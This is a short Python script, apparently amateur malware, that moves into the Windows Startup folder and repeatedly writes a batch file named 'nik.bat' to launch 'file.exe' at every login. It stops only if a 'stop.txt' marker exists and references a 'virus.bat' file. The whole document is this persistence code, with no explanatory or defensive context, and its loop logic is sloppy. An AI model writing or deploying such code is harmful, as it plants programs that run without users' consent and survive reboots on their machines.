import os.path
import os
import shutil
import winshell
import time

global t
t=winshell.startup()
w=winshell.desktop()
os.chdir(t)
def func():
		
		time.sleep(5)
		y=open("nik.bat","w")
		write="start file.exe"
		y.write(write)
		y.close()
		if n==True:
			run=False
run=True
while run:
	
	x=os.path.exists("virus.bat")
	n=os.path.exists("stop.txt")
	if x==True:

		n=os.path.exists("stop.txt")

		run=True
		
		if n==True:
			run=False

	else:
		
		n=os.path.exists("stop.txt")

		func()

